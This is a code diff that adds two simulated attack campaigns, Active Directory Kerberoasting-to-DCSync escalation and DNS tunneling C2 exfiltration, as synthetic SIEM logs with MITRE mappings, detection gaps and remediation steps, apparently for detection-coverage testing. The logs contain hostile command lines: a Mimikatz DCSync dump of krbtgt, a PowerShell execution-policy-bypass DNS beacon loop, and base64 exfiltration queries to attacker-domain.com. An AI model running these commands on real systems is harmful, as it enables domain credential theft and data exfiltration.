@@ -704,5 +704,282 @@ export const CAMPAIGNS: Record<string, Campaign> = {
         }
       }
     ]
+  },
+  active_directory_escalation: {
+    name: "Active Directory Domain Escalation",
+    description: "Simulates an internal threat actor leveraging Kerberoasting (weak RC4 ticket encryption) to obtain service credentials, performing lateral movement via RDP, and executing a DCSync replication request to dump the entire domain database.",
+    metrics: {
+      total: 5,
+      covered: 2,
+      gaps: 2,
+      blindspots: 1
+    },
+    logs: [
+      {
+        "@timestamp": "2026-05-24T17:01:00.120Z",
+        "log.level": "warning",
+        "event": {
+          "category": "identity",
+          "type": "access",
+          "action": "ticket-requested"
+        },
+        "host": { "name": "CORP-DC-01" },
+        "user": { "name": "compromised_user" },
+        "process": {
+          "name": "lsass.exe"
+        },
+        "message": "Kerberos Service Ticket Request (Event ID 4769) requesting weak RC4 (0x17) encryption for SQL Service account.",
+        "mitre_attack": {
+          "tactic": { "id": "TA0006", "name": "Credential Access" },
+          "technique": { "id": "T1558.003", "name": "Steal or Forge Kerberos Tickets: Kerberoasting" }
+        },
+        "detection_status": "Alerted",
+        "coverage_details": {
+          "status": "full_coverage",
+          "rule_name": "Active Directory Kerberoasting via Ticket Requests",
+          "gap_reason": null
+        }
+      },
+      {
+        "@timestamp": "2026-05-24T17:02:15.000Z",
+        "log.level": "critical",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "action": "process-created"
+        },
+        "host": { "name": "DESKTOP-DEV-41" },
+        "user": { "name": "sql_service" },
+        "process": {
+          "name": "cmd.exe",
+          "pid": 9912,
+          "command_line": "cmd.exe /c mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:krbtgt\" exit"
+        },
+        "message": "Anomalous process creation: Command prompt running Mimikatz DCSync arguments.",
+        "mitre_attack": {
+          "tactic": { "id": "TA0006", "name": "Credential Access" },
+          "technique": { "id": "T1003", "name": "OS Credential Dumping" }
+        },
+        "detection_status": "Blind Spot",
+        "coverage_details": {
+          "status": "no_coverage",
+          "gap_id": "GAP-AD-03",
+          "summary": "Mimikatz Process Auditing Bypass",
+          "gap_reason": "Mimikatz process execution occurred inside a non-standard developer directory where host EDR script block audits were disabled, preventing command line parameter capture in SIEM.",
+          "remediation": {
+            "title": "Enable Universal EDR Auditing and Restrict Admin Access",
+            "impact": "Exposes unauthorized Mimikatz usage, preventing DCSync domain replication dumps.",
+            "steps": [
+              "Revoke local admin privileges on developer endpoints.",
+              "Enforce EDR heuristic audits globally on all directories (no exclusion parameters)."
+            ],
+            "cmd": "# Enable Local PowerShell transcription audits via registry\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" /v EnableTranscripting /t REG_DWORD /d 1 /f"
+          }
+        }
+      },
+      {
+        "@timestamp": "2026-05-24T17:03:40.890Z",
+        "log.level": "info",
+        "event": {
+          "category": "directory",
+          "action": "directory-replication-requested"
+        },
+        "host": { "name": "CORP-DC-01" },
+        "user": { "name": "sql_service" },
+        "message": "Domain controller replication request (Event ID 4662) for Control Access right 'Replicating Directory Changes All'.",
+        "mitre_attack": {
+          "tactic": { "id": "TA0006", "name": "Credential Access" },
+          "technique": { "id": "T1003.006", "name": "OS Credential Dumping: DCSync" }
+        },
+        "detection_status": "Monitored",
+        "coverage_details": {
+          "status": "partial_coverage",
+          "gap_id": "GAP-AD-01",
+          "summary": "AD Directory Service Auditing Missing",
+          "gap_reason": "Active Directory Service replication changes are enabled, but the System Access Control List (SACL) on the Active Directory Domain object is missing the Audit entry for the Replicating Directory Changes extended right.",
+          "remediation": {
+            "title": "Configure SACL Audit Settings on Active Directory Root",
+            "impact": "Logs successful and failed non-DC directory replication attempts in AD Security events.",
+            "steps": [
+              "Open ADSI Edit or Active Directory Users and Computers.",
+              "Right click Domain root node -> Properties -> Security -> Advanced -> Auditing.",
+              "Add Principal 'Everyone' -> Type: Success -> Access: Replicating Directory Changes."
+            ]
+          }
+        }
+      },
+      {
+        "@timestamp": "2026-05-24T17:05:00.000Z",
+        "log.level": "info",
+        "event": {
+          "category": "identity",
+          "action": "user-login-successful"
+        },
+        "host": { "name": "CORP-DC-01" },
+        "user": { "name": "sql_service" },
+        "source": { "ip": "192.168.10.45" },
+        "message": "Successful RDP logon (Event ID 4624 Logon Type 10) by user sql_service from source 192.168.10.45.",
+        "mitre_attack": {
+          "tactic": { "id": "TA0008", "name": "Lateral Movement" },
+          "technique": { "id": "T1021.001", "name": "Remote Services: Remote Desktop Protocol" }
+        },
+        "detection_status": "Monitored",
+        "coverage_details": {
+          "status": "full_coverage",
+          "rule_name": "RDP Connection to Domain Controller via Non-Standard Account",
+          "gap_reason": null
+        }
+      },
+      {
+        "@timestamp": "2026-05-24T17:08:12.300Z",
+        "log.level": "info",
+        "event": {
+          "category": "identity",
+          "action": "user-account-created"
+        },
+        "host": { "name": "CORP-DC-01" },
+        "user": { "name": "sql_service" },
+        "message": "New domain user created (Event ID 4720): Target account 'backdoor_admin'.",
+        "mitre_attack": {
+          "tactic": { "id": "TA0003", "name": "Persistence" },
+          "technique": { "id": "T1136.002", "name": "Create Account: Domain Account" }
+        },
+        "detection_status": "Monitored",
+        "coverage_details": {
+          "status": "partial_coverage",
+          "gap_id": "GAP-AD-02",
+          "summary": "Domain User Creation GPO Auditing Disabled",
+          "gap_reason": "Domain member additions are logged, but the Advanced Audit Policy Configuration for User Account Management is not replicated to all backup domain controllers, causing missing events if backup DCs process the request.",
+          "remediation": {
+            "title": "Enable Audit User Account Management policy via GPO",
+            "impact": "Forces Windows Domain Controllers to log account additions.",
+            "steps": [
+              "Configure GPO -> Advanced Audit Policy Configuration -> Account Management -> Audit User Account Management (Success & Failure).",
+              "Sync Group Policy objects across all domain controllers."
+            ]
+          }
+        }
+      }
+    ]
+  },
+  dns_tunneling_c2: {
+    name: "DNS Tunneling & C2 Exfiltration",
+    description: "Simulates an endpoint infected with malware utilizing DNS tunneling to establish a persistent Command and Control (C2) channel and exfiltrate sensitive files disguised as long TXT and CNAME DNS query packets.",
+    metrics: {
+      total: 4,
+      covered: 2,
+      gaps: 1,
+      blindspots: 1
+    },
+    logs: [
+      {
+        "@timestamp": "2026-05-24T18:01:10.120Z",
+        "log.level": "info",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "action": "process-created"
+        },
+        "host": { "name": "DESKTOP-WK-912" },
+        "user": { "name": "bwandt" },
+        "process": {
+          "name": "powershell.exe",
+          "pid": 11024,
+          "command_line": "powershell.exe -ep bypass -command \"while($true){ Resolve-DnsName -Name (Get-Random).toString() -Type TXT; Start-Sleep -s 5 }\""
+        },
+        "message": "PowerShell process spawned executing automated network resolution loop.",
+        "mitre_attack": {
+          "tactic": { "id": "TA0002", "name": "Execution" },
+          "technique": { "id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell" }
+        },
+        "detection_status": "Monitored",
+        "coverage_details": {
+          "status": "full_coverage",
+          "rule_name": "Suspicious Child Process Spawning from Microsoft Office App",
+          "gap_reason": null
+        }
+      },
+      {
+        "@timestamp": "2026-05-24T18:02:15.000Z",
+        "log.level": "warning",
+        "event": {
+          "category": "network",
+          "action": "dns-query-sent"
+        },
+        "host": { "name": "DESKTOP-WK-912" },
+        "destination": { "name": "e2c39d82fb10a459b9cd837de821c9d8a3be019cd82fab409cd83a09e.attacker-domain.com" },
+        "message": "DNS Query sent: CNAME record request for query length 90 characters.",
+        "mitre_attack": {
+          "tactic": { "id": "TA0011", "name": "Command & Control" },
+          "technique": { "id": "T1071.004", "name": "Application Layer Protocol: DNS Traffic" }
+        },
+        "detection_status": "Alerted",
+        "coverage_details": {
+          "status": "full_coverage",
+          "rule_name": "Suspicious DNS Tunneling Query Activity",
+          "gap_reason": null
+        }
+      },
+      {
+        "@timestamp": "2026-05-24T18:03:40.890Z",
+        "log.level": "info",
+        "event": {
+          "category": "network",
+          "action": "dns-query-failed"
+        },
+        "host": { "name": "DESKTOP-WK-912" },
+        "message": "High frequency DNS queries resolving to NXDOMAIN. 1,400 query failures recorded in 2 minutes.",
+        "mitre_attack": {
+          "tactic": { "id": "TA0011", "name": "Command & Control" },
+          "technique": { "id": "T1071.004", "name": "Application Layer Protocol: DNS Traffic" }
+        },
+        "detection_status": "Blind Spot",
+        "coverage_details": {
+          "status": "no_coverage",
+          "gap_id": "GAP-DNS-01",
+          "summary": "Recursive DNS Cache Logging Latency",
+          "gap_reason": "Recursive resolvers resolve queries but do not stream individual lookup failures (NXDOMAIN) or query rate baselines to the SIEM, preventing detection of DGA C2 channels.",
+          "remediation": {
+            "title": "Enable DNS Query Logging on Recursive Resolver",
+            "impact": "Streams DNS request failures, identifying DGA beaconing activities in real-time.",
+            "steps": [
+              "Enable query logging on local DNS servers (Bind9, Windows DNS Server, or Infoblox) and ingest logs.",
+              "In cloud environments, enable Route 53 Query Logging or Azure DNS Private Resolver Query Logs."
+            ]
+          }
+        }
+      },
+      {
+        "@timestamp": "2026-05-24T18:05:12.300Z",
+        "log.level": "info",
+        "event": {
+          "category": "network",
+          "action": "dns-query-sent"
+        },
+        "host": { "name": "DESKTOP-WK-912" },
+        "destination": { "name": "U0VEU19TRUNSRVRfREFUQQ==.attacker-domain.com" },
+        "message": "DNS Query sent: TXT record request for base64 encoded string.",
+        "mitre_attack": {
+          "tactic": { "id": "TA0010", "name": "Exfiltration" },
+          "technique": { "id": "T1048.003", "name": "Exfiltration Over Alternative Protocol - DNS Tunneling" }
+        },
+        "detection_status": "Monitored",
+        "coverage_details": {
+          "status": "partial_coverage",
+          "gap_id": "GAP-DNS-02",
+          "summary": "DNS Payload Inspection Gap",
+          "gap_reason": "DNS query logs record the query lengths and types, but the SIEM parser does not run regex decoders on the subdomain values to flag Base64/Hex exfiltration payloads, causing it to bypass standard threshold alerts.",
+          "remediation": {
+            "title": "Enable Regex Decoders on Subdomains in SIEM",
+            "impact": "Decodes base64/hex characters inside DNS packets to check for cleartext exfiltrations.",
+            "steps": [
+              "Create an ingestion pipeline processor in Logstash / Sentinel to extract subdomains.",
+              "Run decoder functions on subdomains whose length exceeds 30 characters.",
+              "Alert on subdomains containing high entropy values."
+            ]
+          }
+        }
+      }
+    ]
   }
 };
